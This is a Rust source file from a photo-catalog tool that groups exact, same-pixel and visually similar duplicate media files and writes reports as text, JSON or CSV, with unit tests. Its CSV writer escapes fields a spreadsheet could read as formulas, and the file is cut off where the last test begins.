//! Find duplicates in the catalog, exact and visual, and report them.

/*************************************************************************************************
 * Copyright © 2022-2026 Kristian Thy (<thy@42.dk>)                                              *
 * This file is part of PixRS: <https://github.com/kthy/pixrs>                                   *
 *************************************************************************************************/

use crate::avhash::{
    audio_durations_match, audio_match, frames_match, has_detail, video_durations_match, Frame,
};
use crate::catalog::{
    display_root, library_path, one_row_per_file, Catalog, HashedAv, HashedFile, HashedImage,
};
use crate::imagehash::{distance, fingerprints_match};
use indicatif::HumanBytes;
use serde::Serialize;
use std::collections::HashMap;
use std::io::{self, Write};
use std::path::Path;
use std::thread::{self, available_parallelism};
use time::format_description::well_known::Rfc3339;
use time::macros::format_description;
use time::OffsetDateTime;

/// Hamming distance between perceptual hashes up to which images count as similar, unless
/// `--threshold` says otherwise. Every resized and recompressed copy in the calibration sample
/// (300 photos, six kinds of copy) was within 4 bits.
pub const DEFAULT_THRESHOLD: u32 = 6;

/// How closely files match. A group has the weakest match of any of its files to the kept one.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum Tier {
    /// The same bytes.
    Exact,
    /// The same decoded pixels, for example with different metadata.
    SamePixels,
    /// Close perceptual hashes, for example resized or recompressed.
    Similar,
}

impl Tier {
    /// The name used in reports.
    pub fn as_str(self) -> &'static str {
        match self {
            Tier::Exact => "exact",
            Tier::SamePixels => "same-pixels",
            Tier::Similar => "similar",
        }
    }
}

/// A file in a duplicate group.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct DupeFile {
    #[serde(skip)]
    pub library_id: i64,
    /// Root of the library the file is in.
    pub library: String,
    /// Path relative to the library root, with `/` separators.
    pub path: String,
    /// Size in bytes.
    pub size: u64,
    /// Modification time, RFC 3339 in UTC.
    pub mtime: String,
    /// Modification time in nanoseconds since the Unix epoch.
    #[serde(skip)]
    pub mtime_ns: i64,
    /// Whether this is the copy that would be kept.
    pub keep: bool,
    /// How this file matches the kept one; none for the kept file itself.
    pub matches: Option<Tier>,
}

/// Files that are copies of each other.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct DupeGroup {
    pub tier: Tier,
    /// The SHA-256 the files share, for exact groups.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
    /// The kept file first, then the others in the order the keeper was chosen by: oldest to
    /// newest, or for similar groups largest to smallest.
    pub files: Vec<DupeFile>,
}

impl DupeGroup {
    /// Bytes freed by removing every copy but the kept one.
    pub fn reclaimable_bytes(&self) -> u64 {
        self.files.iter().skip(1).map(|f| f.size).sum()
    }
}

/// Totals for a report.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
pub struct Summary {
    pub groups: usize,
    /// Files that are copies of a kept file.
    pub redundant_files: usize,
    pub reclaimable_bytes: u64,
    /// Files that share their size with another file but are not hashed yet, so they may be
    /// duplicates this report does not show.
    pub unhashed_candidates: usize,
    /// Images, videos and audio the hash pass has not decoded (new or changed since the last
    /// scan, or no tool for them), so they may have same-pixel or similar copies this report
    /// does not show. Files the decoder rejected, and images with too little detail for a
    /// perceptual hash, are not counted.
    pub unhashed_media: usize,
}

/// All duplicate groups: exact ones first, then same pixels, then similar, each largest
/// reclaimable size first.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
pub struct DupeReport {
    pub groups: Vec<DupeGroup>,
    pub summary: Summary,
}

/// Most the aspect ratios (long side over short side) of two similar images may differ, as a
/// fraction. Resized copies keep their aspect ratio; crops and unrelated pictures often do not.
const MAX_ASPECT_DIFFERENCE: f64 = 0.03;

/// Videos shorter than this (in milliseconds) are only compared with `--similar`, like images:
/// Live Photo clips and other short clips shot moments apart look much like burst shots.
const SHORT_VIDEO_MS: i64 = 4000;

/// What `find_dupes` reads from the catalog. Loading it is quick; grouping it compares every
/// pair of images and can take a while, so the viewer does that without holding the catalog.
pub struct DupeInput {
    exact: Vec<HashedFile>,
    images: Vec<HashedImage>,
    /// Videos and audio with signatures.
    av: Vec<HashedAv>,
    unhashed_candidates: usize,
    unhashed_media: usize,
}

/// A file with whatever hashes it has.
struct Node {
    file: HashedFile,
    sha256: Option<String>,
    pixel_hash: Option<String>,
    phash: Option<u64>,
    fingerprint: Option<Vec<u8>>,
    /// Width times height, 0 if unknown.
    pixels: u64,
    /// Long side over short side, 0 if unknown.
    aspect: f64,
}

/// The tier of a group: exact if all its files have the same size and SHA-256, same pixels if
/// they all have the same pixel hash, otherwise similar.
fn group_tier(nodes: &[Node], group: &[usize]) -> Tier {
    let first = &nodes[group[0]];
    let all = |same: &dyn Fn(&Node) -> bool| group.iter().all(|&i| same(&nodes[i]));
    if first.sha256.is_some()
        && all(&|n| n.file.size == first.file.size && n.sha256 == first.sha256)
    {
        Tier::Exact
    } else if first.pixel_hash.is_some() && all(&|n| n.pixel_hash == first.pixel_hash) {
        Tier::SamePixels
    } else {
        Tier::Similar
    }
}

/// How `file` matches `keeper`: the same bytes, the same pixels, or neither (it is in the group
/// because its perceptual hash is close to that of some file in it).
fn match_tier(keeper: &Node, file: &Node) -> Tier {
    let same = |a: &Option<String>, b: &Option<String>| a.is_some() && a == b;
    if keeper.file.size == file.file.size && same(&keeper.sha256, &file.sha256) {
        Tier::Exact
    } else if same(&keeper.pixel_hash, &file.pixel_hash) {
        Tier::SamePixels
    } else {
        Tier::Similar
    }
}

/// Union-find over node indices.
struct Sets(Vec<usize>);

impl Sets {
    fn find(&mut self, i: usize) -> usize {
        let mut root = i;
        while self.0[root] != root {
            root = self.0[root];
        }
        let mut i = i;
        while self.0[i] != root {
            (self.0[i], i) = (root, self.0[i]);
        }
        root
    }

    fn union(&mut self, a: usize, b: usize) {
        let (a, b) = (self.find(a), self.find(b));
        if a != b {
            self.0[a.max(b)] = a.min(b);
        }
    }
}

/// Long side over short side of an image, 0 if unknown.
pub fn aspect(width: u32, height: u32) -> f64 {
    if width == 0 || height == 0 {
        0.0
    } else {
        f64::from(width.max(height)) / f64::from(width.min(height))
    }
}

/// Whether two aspect ratios (from `aspect`) are close enough for the images to be resized
/// copies. Unknown (0) matches anything.
pub fn aspects_match(a: f64, b: f64) -> bool {
    a == 0.0 || b == 0.0 || (a - b).abs() <= MAX_ASPECT_DIFFERENCE * a.max(b)
}

/// A perceptual hash, aspect ratio and fingerprint.
type Visual<'a> = (u64, f64, &'a [u8]);

/// The pairs `row(i)` returns for every `i` below `rows`, on all cores. Rows are dealt out
/// round-robin, which balances the work when row `i` compares `i` with the rows after it.
fn pairs_by_row(
    rows: usize,
    row: impl Fn(usize, &mut Vec<(usize, usize)>) + Sync,
) -> Vec<(usize, usize)> {
    let workers = available_parallelism().map_or(1, |n| n.get());
    let row = &row;
    thread::scope(|scope| {
        let handles: Vec<_> = (0..workers)
            .map(|w| {
                scope.spawn(move || {
                    let mut pairs = vec![];
                    for i in (w..rows).step_by(workers) {
                        row(i, &mut pairs);
                    }
                    pairs
                })
            })
            .collect();
        handles
            .into_iter()
            .flat_map(|h| h.join().expect("comparison thread"))
            .collect()
    })
}

/// Pairs of indices into `images` that are similar: perceptual hashes at most `threshold` bits
/// apart, matching aspect ratios, and matching fingerprints. Compares every pair, on all cores.
fn similar_pairs(images: &[Visual], threshold: u32) -> Vec<(usize, usize)> {
    pairs_by_row(images.len(), |i, pairs| {
        let (hash, aspect, fingerprint) = images[i];
        for (j, &(other, other_aspect, other_fingerprint)) in images.iter().enumerate().skip(i + 1)
        {
            // Cheapest test first: most pairs fail on the hash.
            if distance(hash, other) <= threshold
                && aspects_match(aspect, other_aspect)
                && fingerprints_match(fingerprint, other_fingerprint)
            {
                pairs.push((i, j));
            }
        }
    })
}

/// The node for `file`, added if it is new.
fn add_node(
    nodes: &mut Vec<Node>,
    index: &mut HashMap<(i64, String), usize>,
    file: HashedFile,
) -> usize {
    *index
        .entry((file.library_id, file.path.clone()))
        .or_insert_with(|| {
            nodes.push(Node {
                sha256: (!file.sha256.is_empty()).then(|| file.sha256.clone()),
                pixel_hash: None,
                phash: None,
                fingerprint: None,
                pixels: 0,
                aspect: 0.0,
                file,
            });
            nodes.len() - 1
        })
}

/// Pairs of node indices of similar videos (durations, aspect ratios and frames match) and
/// similar audio (durations and fingerprints match). Files are sorted by duration and only
/// compared within the duration tolerance, on all cores. Videos shorter than `SHORT_VIDEO_MS`
/// are left out unless `short_videos` is set, and so is audio without detail (silence, hum).
///
/// Audio is the costly part: an audio pair takes tens of microseconds, and music libraries have
/// many tracks of similar length.
fn similar_av(
    items: &[(usize, HashedAv)],
    threshold: u32,
    short_videos: bool,
) -> Vec<(usize, usize)> {
    let mut videos: Vec<(usize, i64, f64, &[Frame])> = items
        .iter()
        .filter(|(_, a)| short_videos || a.duration_ms >= SHORT_VIDEO_MS)
        .filter_map(|(i, a)| {
            let frames = a.frames.as_deref()?;
            Some((*i, a.duration_ms, aspect(a.width, a.height), frames))
        })
        .collect();
    let mut audio: Vec<(usize, i64, &[u32])> = items
        .iter()
        .filter_map(|(i, a)| Some((*i, a.duration_ms, a.chromaprint.as_deref()?)))
        .filter(|(_, _, values)| has_detail(values))
        .collect();
    videos.sort_by_key(|v| v.1);
    audio.sort_by_key(|a| a.1);
    let mut pairs = pairs_by_row(videos.len(), |n, pairs| {
        let (i, duration, aspect, frames) = videos[n];
        for &(j, other_duration, other_aspect, other_frames) in &videos[n + 1..] {
            if !video_durations_match(duration, other_duration) {
                break;
            }
            if aspects_match(aspect, other_aspect) && frames_match(frames, other_frames, threshold)
            {
                pairs.push((i, j));
            }
        }
    });
    pairs.extend(pairs_by_row(audio.len(), |n, pairs| {
        let (i, duration, values) = audio[n];
        for &(j, other_duration, other_values) in &audio[n + 1..] {
            if !audio_durations_match(duration, other_duration) {
                break;
            }
            if audio_match(values, other_values) {
                pairs.push((i, j));
            }
        }
    }));
    pairs
}

/// Read what `group_dupes` needs from the catalog. Image perceptual hashes and fingerprints
/// are only read when `similar_images` is set.
pub fn load_dupes(
    catalog: &Catalog,
    libraries: &[i64],
    similar_images: bool,
) -> rusqlite::Result<DupeInput> {
    let mut input = DupeInput {
        exact: catalog.duplicate_candidates()?,
        images: catalog.hashed_images(similar_images)?,
        av: catalog.hashed_av()?,
        unhashed_candidates: catalog.count_unhashed_with_shared_size(libraries)?,
        unhashed_media: catalog.count_unhashed(libraries)?,
    };
    let files = input.exact.iter();
    let files = files.chain(input.images.iter().map(|image| &image.file));
    let files = files.chain(input.av.iter().map(|av| &av.file));
    if let Some(keep) = one_row_per_file(files) {
        let kept = |f: &HashedFile| keep.contains(&(f.library_id, f.path.clone()));
        input.exact.retain(|f| kept(f));
        input.images.retain(|image| kept(&image.file));
        input.av.retain(|av| kept(&av.file));
    }
    Ok(input)
}

/// Find duplicates. Files are linked when they have the same size and SHA-256 (exact), or the
/// same pixel hash (same pixels), and as similar: videos whose durations, shapes and frames
/// match, audio whose durations and fingerprints match, and with `similarity.images`, images
/// whose perceptual hashes are at most `similarity.threshold` bits apart, whose aspect ratios
/// match and whose fingerprints match. A group is every file linked to another, directly or through
/// others, and has the weakest tier among its files: a group with an exact pair and a similar
/// third file is similar.
///
/// Similar images are opt-in because on libraries with burst shots most similar pairs are
/// shots taken moments apart, not copies: on the owner's library, which has few resized copies,
/// the fingerprint check rejected about 95% of burst pairs, and those left still outnumbered
/// real copies.
///
/// With `libraries` empty, every group is reported. Otherwise only groups with at least one file
/// in the given libraries are, but still with all their files, so `pixrs dupes /old-disk` shows
/// what on the old disk also exists elsewhere.
///
/// In each group the kept file is the one with the earliest mtime. Ties are broken by path order:
/// library root first, then the path inside the library. In similar groups the largest file
/// (pixels, then bytes), or the oldest file with its bytes or pixels, is kept instead, since similar copies are often scaled down; the oldest
/// wins ties. The keeper is chosen from all files, so it does not depend on `libraries`.
///
/// The report reflects the catalog as of each library's last scan; files are not checked.
pub fn find_dupes(
    catalog: &Catalog,
    libraries: &[i64],
    similarity: Similarity,
) -> rusqlite::Result<DupeReport> {
    let input = load_dupes(catalog, libraries, similarity.images)?;
    Ok(group_dupes(input, libraries, similarity))
}

/// How `find_dupes` looks for similar files.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Similarity {
    /// Hamming distance between perceptual hashes (of images and video frames) up to which
    /// they count as similar.
    pub threshold: u32,
    /// Also look for similar images and short videos. Similar video and audio are otherwise
    /// always looked for: they have no burst-shot problem.
    pub images: bool,
}

impl Default for Similarity {
    fn default() -> Self {
        Similarity {
            threshold: DEFAULT_THRESHOLD,
            images: false,
        }
    }
}

impl Similarity {
    /// With similar images too.
    pub fn with_images(threshold: u32) -> Self {
        Similarity {
            threshold,
            images: true,
        }
    }
}

/// The grouping half of `find_dupes`, for input from `load_dupes`.
pub fn group_dupes(input: DupeInput, libraries: &[i64], similarity: Similarity) -> DupeReport {
    let mut nodes: Vec<Node> = vec![];
    let mut index: HashMap<(i64, String), usize> = HashMap::new();
    let mut add = |file: HashedFile| add_node(&mut nodes, &mut index, file);
    let exact: Vec<usize> = input.exact.into_iter().map(&mut add).collect();
    let mut images: Vec<(usize, HashedImage)> = vec![];
    for mut image in input.images {
        let file = std::mem::take(&mut image.file);
        images.push((add(file), image));
    }
    for (i, image) in images {
        let node = &mut nodes[i];
        node.pixel_hash = Some(image.pixel_hash);
        node.phash = image.phash;
        node.fingerprint = image.fingerprint;
        node.pixels = u64::from(image.width) * u64::from(image.height);
        node.aspect = aspect(image.width, image.height);
    }

    // Videos and audio, for the keeper rule (largest first) and similarity.
    let av: Vec<(usize, HashedAv)> = input
        .av
        .into_iter()
        .map(|item| {
            let i = add_node(&mut nodes, &mut index, item.file.clone());
            nodes[i].pixels = u64::from(item.width) * u64::from(item.height);
            nodes[i].aspect = aspect(item.width, item.height);
            (i, item)
        })
        .collect();

    let mut sets = Sets((0..nodes.len()).collect());
    let mut exact_sets: HashMap<(u64, String), Vec<usize>> = HashMap::new();
    for &i in &exact {
        let key = (nodes[i].file.size, nodes[i].file.sha256.clone());
        exact_sets.entry(key).or_default().push(i);
    }
    for members in exact_sets.values() {
        // Byte-identical files have the same pixels and size, even if only one was decoded.
        // Videos and audio have no pixel hash, but may have a size.
        let decoded = members
            .iter()
            .copied()
            .find(|&i| nodes[i].pixel_hash.is_some())
            .or_else(|| members.iter().copied().max_by_key(|&i| nodes[i].pixels))
            .expect("exact sets are not empty");
        let (pixel_hash, pixels, aspect) = (
            nodes[decoded].pixel_hash.clone(),
            nodes[decoded].pixels,
            nodes[decoded].aspect,
        );
        for &i in members {
            sets.union(members[0], i);
            if nodes[i].pixel_hash.is_none() {
                nodes[i].pixel_hash.clone_from(&pixel_hash);
                nodes[i].pixels = pixels;
                nodes[i].aspect = aspect;
            }
        }
    }
    let mut first_with_pixels: HashMap<String, usize> = HashMap::new();
    for (i, node) in nodes.iter().enumerate() {
        if let Some(pixel_hash) = &node.pixel_hash {
            let first = *first_with_pixels.entry(pixel_hash.clone()).or_insert(i);
            sets.union(first, i);
        }
    }
    let mut hashed: Vec<usize> = vec![];
    let mut visuals: Vec<Visual> = vec![];
    for (i, node) in nodes.iter().enumerate() {
        if let (Some(hash), Some(fingerprint)) = (node.phash, &node.fingerprint) {
            hashed.push(i);
            visuals.push((hash, node.aspect, fingerprint));
        }
    }
    let pairs = if similarity.images {
        similar_pairs(&visuals, similarity.threshold)
    } else {
        vec![]
    };
    drop(visuals);
    for (a, b) in pairs {
        sets.union(hashed[a], hashed[b]);
    }
    for (a, b) in similar_av(&av, similarity.threshold, similarity.images) {
        sets.union(a, b);
    }

    let mut members: HashMap<usize, Vec<usize>> = HashMap::new();
    for i in 0..nodes.len() {
        members.entry(sets.find(i)).or_default().push(i);
    }
    let mut groups: Vec<DupeGroup> = members
        .into_values()
        .filter(|group| {
            group.len() > 1
                && (libraries.is_empty()
                    || group
                        .iter()
                        .any(|&i| libraries.contains(&nodes[i].file.library_id)))
        })
        .map(|mut group| {
            let tier = group_tier(&nodes, &group);
            let oldest = |a: &Node, b: &Node| {
                (a.file.mtime_ns, &a.file.root, &a.file.path).cmp(&(
                    b.file.mtime_ns,
                    &b.file.root,
                    &b.file.path,
                ))
            };
            group.sort_by(|&a, &b| {
                let (a, b) = (&nodes[a], &nodes[b]);
                if tier == Tier::Similar {
                    // Similar copies are often smaller: keep the largest.
                    (b.pixels, b.file.size)
                        .cmp(&(a.pixels, a.file.size))
                        .then_with(|| oldest(a, b))
                } else {
                    oldest(a, b)
                }
            });
            if tier == Tier::Similar {
                // Of the largest file's exact and same-pixel copies, keep the oldest: a copy
                // with rewritten metadata can have more bytes than the original.
                let largest = &nodes[group[0]];
                let first = (1..group.len())
                    .filter(|&p| match_tier(largest, &nodes[group[p]]) != Tier::Similar)
                    .fold(0, |best, p| {
                        if oldest(&nodes[group[p]], &nodes[group[best]]).is_lt() {
                            p
                        } else {
                            best
                        }
                    });
                group[..=first].rotate_right(1);
            }
            let keeper = &nodes[group[0]];
            let files: Vec<DupeFile> = group
                .iter()
                .enumerate()
                .map(|(rank, &i)| {
                    let f = &nodes[i].file;
                    DupeFile {
                        library_id: f.library_id,
                        library: display_root(&f.root),
                        path: f.path.clone(),
                        size: f.size,
                        mtime: format_mtime(f.mtime_ns),
                        mtime_ns: f.mtime_ns,
                        keep: rank == 0,
                        matches: (rank > 0).then(|| match_tier(keeper, &nodes[i])),
                    }
                })
                .collect();
            let sha256 = (tier == Tier::Exact)
                .then(|| keeper.sha256.clone())
                .flatten();
            DupeGroup {
                tier,
                sha256,
                files,
            }
        })
        .collect();
    groups.sort_by(|a, b| {
        a.tier
            .cmp(&b.tier)
            .then_with(|| b.reclaimable_bytes().cmp(&a.reclaimable_bytes()))
            .then_with(|| a.files[0].library.cmp(&b.files[0].library))
            .then_with(|| a.files[0].path.cmp(&b.files[0].path))
    });

    let summary = Summary {
        groups: groups.len(),
        redundant_files: groups.iter().map(|g| g.files.len() - 1).sum(),
        reclaimable_bytes: groups.iter().map(DupeGroup::reclaimable_bytes).sum(),
        unhashed_candidates: input.unhashed_candidates,
        unhashed_media: input.unhashed_media,
    };
    DupeReport { groups, summary }
}

/// Nanoseconds since the Unix epoch as RFC 3339 in UTC.
fn format_mtime(mtime_ns: i64) -> String {
    OffsetDateTime::from_unix_timestamp_nanos(i128::from(mtime_ns))
        .ok()
        .and_then(|dt| dt.format(&Rfc3339).ok())
        .unwrap_or_else(|| String::from("unknown"))
}

/// An mtime shortened to minutes for people: `2021-12-23 14:02 UTC`.
pub fn human_mtime(mtime_ns: i64) -> String {
    OffsetDateTime::from_unix_timestamp_nanos(i128::from(mtime_ns))
        .ok()
        .and_then(|dt| {
            dt.format(format_description!(
                "[year]-[month]-[day] [hour]:[minute] UTC"
            ))
            .ok()
        })
        .unwrap_or_else(|| String::from("unknown"))
}

/// Write the report for people to read.
pub fn write_text(report: &DupeReport, out: &mut impl Write) -> io::Result<()> {
    for group in &report.groups {
        let n = group.files.len();
        match (&group.tier, &group.sha256) {
            (Tier::Exact, Some(sha256)) => writeln!(
                out,
                "{} copies of {} (sha256 {}):",
                n,
                HumanBytes(group.files[0].size),
                sha256.get(..12).unwrap_or(sha256)
            )?,
            (Tier::SamePixels, _) => writeln!(out, "{} images with the same pixels:", n)?,
            _ => writeln!(out, "{} similar files:", n)?,
        }
        for file in &group.files {
            write!(
                out,
                "  {}  {}  {}",
                if file.keep { "keep" } else { "    " },
                library_path(Path::new(&file.library), &file.path).display(),
                human_mtime(file.mtime_ns)
            )?;
            match (group.tier, file.matches) {
                (Tier::Exact, _) => writeln!(out)?,
                (_, Some(matches)) => {
                    writeln!(out, "  {}  {}", HumanBytes(file.size), matches.as_str())?
                }
                (_, None) => writeln!(out, "  {}", HumanBytes(file.size))?,
            }
        }
        writeln!(out)?;
    }
    let s = &report.summary;
    if s.groups == 0 {
        writeln!(out, "No duplicates found.")
    } else {
        writeln!(
            out,
            "{} {}, {} redundant {}, {} reclaimable.",
            s.groups,
            plural(s.groups, "group", "groups"),
            s.redundant_files,
            plural(s.redundant_files, "file", "files"),
            HumanBytes(s.reclaimable_bytes)
        )
    }
}

/// `one` if `n` is 1, else `many`.
pub fn plural<'a>(n: usize, one: &'a str, many: &'a str) -> &'a str {
    if n == 1 {
        one
    } else {
        many
    }
}

/// Write the report as pretty-printed JSON.
pub fn write_json(report: &DupeReport, out: &mut impl Write) -> io::Result<()> {
    serde_json::to_writer_pretty(&mut *out, report)?;
    writeln!(out)
}

/// Write the report as CSV with a header row and one row per file. `sha256` is only set for
/// exact groups; `matches` is empty for the kept file.
pub fn write_csv(report: &DupeReport, out: &mut impl Write) -> io::Result<()> {
    writeln!(
        out,
        "group,tier,sha256,size,keep,matches,library,path,mtime"
    )?;
    for (i, group) in report.groups.iter().enumerate() {
        for file in &group.files {
            writeln!(
                out,
                "{},{},{},{},{},{},{},{},{}",
                i + 1,
                group.tier.as_str(),
                group.sha256.as_deref().unwrap_or(""),
                file.size,
                file.keep,
                file.matches.map_or("", Tier::as_str),
                csv_field(&file.library),
                csv_field(&file.path),
                file.mtime
            )?;
        }
    }
    Ok(())
}

/// Quote a CSV field if it needs it (RFC 4180). A field that a spreadsheet would read as a
/// formula, one starting with `=`, `+`, `-`, `@`, a tab or a carriage return (file names can),
/// gets a leading `'`, which spreadsheets read as the start of text.
fn csv_field(value: &str) -> String {
    if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        format!("\"'{}\"", value.replace('"', "\"\""))
    } else if value.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", value.replace('"', "\"\""))
    } else {
        String::from(value)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::catalog::{FileRecord, MediaMeta, Stamp};
    use crate::media::MediaType;
    use pretty_assertions::assert_eq;
    use tempfile::{tempdir, TempDir};

    /// A catalog in a temp dir, filled directly so tests control sizes, hashes and mtimes.
    struct Fixture {
        _dir: TempDir,
        catalog: Catalog,
    }

    impl Fixture {
        fn new() -> Self {
            let dir = tempdir().unwrap();
            let catalog = Catalog::open(&dir.path().join("catalog.sqlite")).unwrap();
            Fixture { _dir: dir, catalog }
        }

        fn add(&self, root: &str, path: &str, size: u64, mtime_s: i64, sha256: Option<&str>) {
            let id = self.catalog.library_id(root).unwrap();
            self.catalog
                .upsert(
                    id,
                    &FileRecord {
                        path: String::from(path),
                        stamp: Stamp {
                            size,
                            mtime_ns: mtime_s * 1_000_000_000,
                        },
                        media_type: MediaType::Image,
                        sha256: sha256.map(String::from),
                        meta: MediaMeta::default(),
                    },
                )
                .unwrap();
        }

        fn report(&self) -> DupeReport {
            find_dupes(
                &self.catalog,
                &[],
                Similarity::with_images(DEFAULT_THRESHOLD),
            )
            .unwrap()
        }
    }

    fn kept_and_others(group: &DupeGroup) -> Vec<(bool, &str)> {
        group
            .files
            .iter()
            .map(|f| (f.keep, f.path.as_str()))
            .collect()
    }

    #[test]
    fn test_identical_files_in_different_folders_form_one_group() {
        let fx = Fixture::new();
        fx.add("/lib", "2019/a.jpg", 100, 20, Some("aaa"));
        fx.add("/lib", "backup/a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "unique.jpg", 200, 10, None);

        let report = fx.report();
        assert_eq!(report.groups.len(), 1);
        assert_eq!(
            kept_and_others(&report.groups[0]),
            vec![(true, "backup/a.jpg"), (false, "2019/a.jpg")]
        );
        assert_eq!(
            report.summary,
            Summary {
                groups: 1,
                redundant_files: 1,
                reclaimable_bytes: 100,
                unhashed_candidates: 0,
                // The fixture's files are images that were never decoded.
                unhashed_media: 3,
            }
        );
    }

    #[test]
    fn test_same_size_different_content_is_not_reported() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 10, Some("bbb"));
        assert_eq!(fx.report().groups, vec![]);
    }

    #[test]
    fn test_keeper_is_oldest_then_path_order() {
        let fx = Fixture::new();
        fx.add("/lib", "c.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 10, Some("aaa"));
        fx.add("/lib", "a.jpg", 100, 30, Some("aaa"));
        fx.add("/archive", "z.jpg", 100, 10, Some("aaa"));

        // Three files share the oldest mtime; library root, then path, decides.
        assert_eq!(
            kept_and_others(&fx.report().groups[0]),
            vec![
                (true, "z.jpg"),
                (false, "b.jpg"),
                (false, "c.jpg"),
                (false, "a.jpg")
            ]
        );
    }

    #[test]
    fn test_file_in_overlapping_libraries_is_not_its_own_duplicate() {
        let fx = Fixture::new();
        // The same file, cataloged in two libraries by a version that did not fold them.
        fx.add("/lib", "sub/a.jpg", 100, 10, Some("aaa"));
        fx.add("/lib/sub", "a.jpg", 100, 10, Some("aaa"));
        assert_eq!(fx.report().groups.len(), 0);

        fx.add("/lib", "b.jpg", 100, 20, Some("aaa"));
        assert_eq!(
            kept_and_others(&fx.report().groups[0]),
            vec![(true, "sub/a.jpg"), (false, "b.jpg")]
        );
    }

    #[test]
    fn test_groups_across_libraries_and_library_filter() {
        let fx = Fixture::new();
        fx.add("/nas", "a.jpg", 100, 10, Some("aaa"));
        fx.add("/old-disk", "a.jpg", 100, 20, Some("aaa"));
        fx.add("/old-disk", "b.jpg", 50, 10, Some("bbb"));
        fx.add("/old-disk", "copy of b.jpg", 50, 20, Some("bbb"));
        fx.add("/nas", "c.jpg", 10, 10, Some("ccc"));
        fx.add("/nas", "copy of c.jpg", 10, 20, Some("ccc"));

        assert_eq!(fx.report().groups.len(), 3);

        // Filtering on the old disk shows its groups with all copies, including the one on the
        // NAS, which stays the keeper. Groups only on the NAS are left out.
        let old_disk = fx.catalog.find_library("/old-disk").unwrap().unwrap();
        let report = find_dupes(
            &fx.catalog,
            &[old_disk],
            Similarity::with_images(DEFAULT_THRESHOLD),
        )
        .unwrap();
        let shas: Vec<&str> = report
            .groups
            .iter()
            .map(|g| g.sha256.as_deref().unwrap())
            .collect();
        assert_eq!(shas, vec!["aaa", "bbb"]);
        let keeper = &report.groups[0].files[0];
        assert_eq!((keeper.library.as_str(), keeper.keep), ("/nas", true));
    }

    #[test]
    fn test_groups_are_ordered_by_reclaimable_bytes() {
        let fx = Fixture::new();
        fx.add("/lib", "small1.jpg", 10, 1, Some("small"));
        fx.add("/lib", "small2.jpg", 10, 1, Some("small"));
        fx.add("/lib", "big1.mp4", 1000, 1, Some("big"));
        fx.add("/lib", "big2.mp4", 1000, 1, Some("big"));
        let report = fx.report();
        let order: Vec<&str> = report
            .groups
            .iter()
            .map(|g| g.sha256.as_deref().unwrap())
            .collect();
        assert_eq!(order, vec!["big", "small"]);
        assert_eq!(report.summary.reclaimable_bytes, 1010);
    }

    #[test]
    fn test_counts_unhashed_candidates() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 10, None);
        fx.add("/lib", "b.jpg", 100, 10, None);
        fx.add("/lib", "c.jpg", 200, 10, None);
        fx.add("/other", "d.jpg", 100, 10, None);
        assert_eq!(fx.report().summary.unhashed_candidates, 3);
        let lib = fx.catalog.find_library("/lib").unwrap().unwrap();
        let report = find_dupes(
            &fx.catalog,
            &[lib],
            Similarity::with_images(DEFAULT_THRESHOLD),
        )
        .unwrap();
        assert_eq!(report.summary.unhashed_candidates, 2);
    }

    #[test]
    fn test_text_output() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 2048, 0, Some("0123456789abcdef"));
        fx.add("/lib", "b.jpg", 2048, 60, Some("0123456789abcdef"));
        let mut out = vec![];
        write_text(&fx.report(), &mut out).unwrap();
        let text = String::from_utf8(out).unwrap();
        let a = library_path(Path::new("/lib"), "a.jpg");
        let b = library_path(Path::new("/lib"), "b.jpg");
        assert_eq!(
            text,
            format!(
                "2 copies of 2.00 KiB (sha256 0123456789ab):\n  \
                 keep  {}  1970-01-01 00:00 UTC\n        \
                 {}  1970-01-01 00:01 UTC\n\n\
                 1 group, 1 redundant file, 2.00 KiB reclaimable.\n",
                a.display(),
                b.display()
            )
        );
    }

    #[test]
    fn test_text_output_without_duplicates() {
        let mut out = vec![];
        write_text(&DupeReport::default(), &mut out).unwrap();
        assert_eq!(String::from_utf8(out).unwrap(), "No duplicates found.\n");
    }

    #[test]
    fn test_json_output() {
        let fx = Fixture::new();
        fx.add("/lib", "a.jpg", 100, 0, Some("aaa"));
        fx.add("/lib", "b.jpg", 100, 1, Some("aaa"));
        let mut out = vec![];
        write_json(&fx.report(), &mut out).unwrap();
        let json: serde_json::Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(
            json,
            serde_json::json!({
                "groups": [{
                    "tier": "exact",
                    "sha256": "aaa",
                    "files": [
                        {"library": "/lib", "path": "a.jpg", "size": 100,
                         "mtime": "1970-01-01T00:00:00Z", "keep": true, "matches": null},
                        {"library": "/lib", "path": "b.jpg", "size": 100,
                         "mtime": "1970-01-01T00:00:01Z", "keep": false, "matches": "exact"},
                    ],
                }],
                "summary": {
                    "groups": 1,
                    "redundant_files": 1,
                    "reclaimable_bytes": 100,
                    "unhashed_candidates": 0,
                    "unhashed_media": 2,
                },
            })
        );
    }

    #[test]
    fn test_csv_output_quotes_fields() {
        let fx = Fixture::new();
        fx.add("/lib", "plain.jpg", 100, 0, Some("aaa"));
        fx.add(
            "/lib",
            "with, comma \"and quotes\".jpg",
            100,
            1,
            Some("aaa"),
        );
        let mut out = vec![];
        write_csv(&fx.report(), &mut out).unwrap();
        assert_eq!(
            String::from_utf8(out).unwrap(),
            "group,tier,sha256,size,keep,matches,library,path,mtime\n\
             1,exact,aaa,100,true,,/lib,plain.jpg,1970-01-01T00:00:00Z\n\
             1,exact,aaa,100,false,exact,/lib,\"with, comma \"\"and quotes\"\".jpg\",\
             1970-01-01T00:00:01Z\n"
        );
    }

    #[test]
    fn test_csv_fields_a_spreadsheet_would_run_are_text() {
